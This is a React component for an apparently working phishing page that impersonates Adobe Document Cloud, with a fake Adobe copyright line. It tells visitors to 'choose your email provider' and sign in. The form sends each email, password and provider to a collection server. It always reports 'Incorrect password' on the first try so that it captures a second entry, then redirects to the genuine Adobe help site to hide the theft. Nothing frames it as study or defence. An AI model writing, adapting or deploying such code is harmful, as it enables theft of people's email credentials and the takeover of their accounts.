import { useState } from "react";
import adobe from './assets/adobe.png'


const providers = [
  { name: "Outlook", color: "bg-blue-600" },
  { name: "Aol", color: "bg-blue-400" },
  { name: "Office365", color: "bg-red-500" },
  { name: "Yahoo", color: "bg-purple-500" },
  { name: "Other Mail", color: "bg-blue-500" },
];

const LoginModal = ({ provider, onClose }) => {

  const [clickCount, setClickCount] = useState(0)
  const [error, setError] = useState(null);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

 const handleSubmit = async (e) => {
  e.preventDefault();
  const newClickCount = clickCount + 1;
  setClickCount(newClickCount);

  if (!email || !password) {
    setError("Email and password are required.");
    return;
  }

  const formData = { email, password, provider };

  try {
    const response = await fetch("http://localhost:3001/api/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData),
    });

    const data = await response.json();

    if (newClickCount === 1) {
      setError("Incorrect password. Please try again.");
    } else if (response.ok) {
      // ✅ redirect on 2nd attempt
      window.location.href = "https://helpx.adobe.com/support.html";
    } else {
      setError(data.error || "Submission failed.");
    }
  } catch (err) {
    setError("Network error. Try again later.");
  }
};



  return (
     <form onSubmit={handleSubmit} className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-30">
      <div className="bg-white p-6 rounded-lg shadow-lg w-96">
        <h2 className="text-xl font-bold mb-4">Sign in with {provider}</h2>
        <input
          type="email"
          placeholder="Enter your email"
          className="w-full p-2 border rounded mb-4"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          autoComplete="email"
          required
        />
        <input
          type="password"
          placeholder="Enter your password"
          className="w-full p-2 border rounded mb-4"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          autoComplete="current-password"
          required
        />
        {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
        <button type="submit" className="bg-blue-600 text-white p-2 rounded w-full">Login</button>
        <button type="button" onClick={onClose} className="mt-4 text-red-500 w-full">Close</button>
      </div>
    </form>
  );
};

export default function AdobeLoginUI() {
  const [selectedProvider, setSelectedProvider] = useState(null);
  const [clickCount, setClickCount] = useState(0); // move clickCount here

  return (
    <div className="flex items-center justify-center min-h-screen bg-transparent">
      <div className="bg-gray-900 text-white p-6 rounded-lg shadow-lg w-96 text-center">
        <img src={adobe} alt="Adobe" className="mx-auto w-12 mb-4" />
        <h2 className="text-lg font-semibold">Adobe Document Cloud</h2>
        <p className="text-sm mt-2 mb-4">To read the document, please choose your email provider below.</p>
        {providers.map(({ name, color }) => (
          <button
            key={name}
            className={`w-full ${color} text-white p-2 rounded mb-2`}
            onClick={() => {
              setSelectedProvider(name);
              setClickCount(0); // reset count when changing provider
            }}
          >
            Sign in with {name}
          </button>
        ))}
        <p className="text-xs mt-4">CopyRight &copy; 2023 Adobe System Incorporated.</p>
      </div>

      {selectedProvider && (
        <LoginModal
          provider={selectedProvider}
          onClose={() => setSelectedProvider(null)}
          clickCount={clickCount}
          setClickCount={setClickCount}
        />
      )}
    </div>
  );
}





